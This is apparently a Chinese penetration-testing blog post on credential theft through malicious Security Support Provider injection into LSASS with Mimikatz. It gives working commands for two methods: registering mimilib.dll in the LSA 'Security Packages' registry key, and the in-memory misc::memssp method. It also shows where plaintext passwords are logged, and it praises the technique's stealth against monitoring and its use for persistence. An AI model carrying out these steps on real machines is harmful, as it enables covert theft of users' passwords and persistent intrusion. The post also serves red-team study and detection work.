# 0x01 概念
SSP，微软官方文档里面有两个东西。

- [Security Service Provider](https://docs.microsoft.com/en-us/windows/win32/p2psdk/security-service-providers)
- [Security Support Provider](https://docs.microsoft.com/en-us/windows/win32/rpc/security-support-providers-ssps-)

问了下都说这两个东西是一个东西，总之不管是不是一个东西，都是 Windows 用于扩展身份验证机制的 API。在国外有关渗透的文档中，SSP 更多的被指向于 `Security Support Provider`。

Security Support Provider 就是安全支持提供程序，是 Windows API，用于扩展 Windows 身份验证机制。LSASS 进程会在 Windows 启动期间加载 SSP dll。

# 0x02 利用

SSP 一个是用于 Windows 身份认证的 dll，在系统启动时此 dll 会被加载到 lsass.exe 进程中。
此行为有以下利用思路：

- 删除一个任意的 SSP DLL 以便与 LSASS 进程进行交互并记录该进程中存储的所有密码
- 直接使用自定义的恶意 dll 来伪造 SSP，以此来从 lsass.exe 进程中提取用户登录时的明文账号密码，这样可以对 LSASS 进程进行修补而无需接触磁盘（内存中）

此技术可用于收集系凭据，并将这些凭据与另一协议（例如 `RDP`、`WMI` 等）结合使用。

此技术的优势在于其隐蔽性、动静小，小于一些一些常规的主动密码搜集方式、探测横向，一些的网管和监控很难及时有效察觉，从而我们可以在目标网络中保持持久性。

向主机注入恶意的 SSP **需要管理员级别的特权**，并且可以使用两种方法：

1. 注册 SSP DLL
2. 纯内存

# 0x03 工具

`Mimikatz`，`Empire` 和 `PowerSploit` 都支持这两种方法。

另外因为 Mimikatz 已集成到 SharpSploitConsole 中，该应用程序旨在与 Ryan Cobb 发布的 SharpSploit 进行交互。SharpSploit 是一个 .NET 后期开发库，具有与 PowerSploit 类似的功能。当前，SharpSploitConsole 通过 Mimikatz 模块支持内存技术。

总结下，可利用的工具为：

- `Mimikatz`
- `Empire`
- `PowerSploit`
- `SharpSploitConsole`

本文中，只讨论 Mimikatz，其他的后面再写。实验环境：WIN 7 SP1 x64


## 方法一：注册 SSP DLL

Mimikatz 项目提供了适用于不同位数电脑的 DLL 文件（mimilib.dll），可以将其放到 LSASS 进程（System32）的相同位置，以便为访问受感染主机的任何用户以纯文本格式获得凭据。

```
C:\Windows\System32\
```

![title](https://leanote.com/api/file/getImage?fileId=5e0d6861ab6441287f00540f)

将文件传输到上述位置后，需要修改注册表项，来包括新的 SSP —— mimilib dll。

```
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
```

![title](https://leanote.com/api/file/getImage?fileId=5e0d6998ab6441287f00543f)

查看 `Security Packages` 注册表项来验证是否已注入恶意 SSP。

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```

![title](https://leanote.com/api/file/getImage?fileId=5e0d7812ab6441287f0056d7)

如图已注入。

由于注册表已被篡改并且 DLL 存储在系统中，因此该方法将在重新启动后继续存在。

当域用户再次通过系统进行身份验证时，将创建一个名为 `kiwissp` 的新文件，该文件将记录帐户的凭据。

```
C:\Windows\System32\kiwissp.log
```

- 工作组环境测试（抓到了明文密码）

锁定电脑之后使用 Guest 用户登录，就抓到了 Guest 用户的明文密码。

![title](https://leanote.com/api/file/getImage?fileId=5e0d7c2bab64412a83005693)

- 域内主机测试

![title](https://leanote.com/api/file/getImage?fileId=5e0d882dab64412a830058dc)



## 方法二：纯内存

Mimikatz 通过向 LSASS 注入新的安全支持提供程序（SSP）来支持内存技术选项。此技术不需要将 `mimilib.dll` 放入磁盘或创建注册表项。但是，缺点是在重新启动过程中不会持续存在。

```
privilege::debug
misc::memssp
```

![title](https://leanote.com/api/file/getImage?fileId=5e0d89e0ab6441287f005a42)

注：运行此 mimikatz 需要在管理员权限下。`ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061` 表示所需的特权不是由客户端拥有的（通常你不是管理员）。

然后、当用户再次通过系统进行身份验证时，将在 `System32` 中创建一个日志文件，其中将包含**纯文本用户密码**。

```
C:\Windows\System32\mimilsa.log
```

如图，当前还没用户进行身份验证，所以 `System32` 目录下还不存在 mimilsa.log 日志：

![title](https://leanote.com/api/file/getImage?fileId=5e0d8b1fab64412a83005972)

切出去用 `Guest` 用户登录下，然后再次查看：

![title](https://leanote.com/api/file/getImage?fileId=5e0d8b7bab6441287f005a8a)

已经出现了此文件，并且记录了我的 `Guest` 用户的纯文本密码（但是出现了2遍...）。

域用户登录也是一样的：

![title](https://leanote.com/api/file/getImage?fileId=5e0d8bc6ab6441287f005a97)


# 0x04 总结

这种注入恶意 SSP 进行凭据密码抓取的技术，是一种被动密码搜集的方法。

对于一些防护森严的内网，这种密码搜集方式，往往更加有效隐蔽。


此技术可用于收集一个或多个系统中的凭据，并将这些凭据与另一协议（例如 RDP，WMI 等）结合使用，以免干扰雷达，从而在网络中保持持久性。

向主机注入恶意 SSP 的前提：

1. 需要管理员级别的特权

具体方法：

1. 注册 SSP dll。通过更改注册表项，优点是重启之后仍然有效。
2. 纯内存。缺点是重启之后不再有效。

--------------------------------------

# 参考文档：

1. [Persistence – Security Support Provider](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)，Penetration Testing Lab，Administrator，2019年10月21日
2. 内网被动密码搜集[一]，Klion
3. [Sneaky Active Directory Persistence #12: Malicious Security Support Provider (SSP)](https://adsecurity.org/?p=1760)，ADSecurity，Sean Metcalf，2015年9月16日


# What's more?

![title](https://leanote.com/api/file/getImage?fileId=5e0dad70ab64412a830060b1)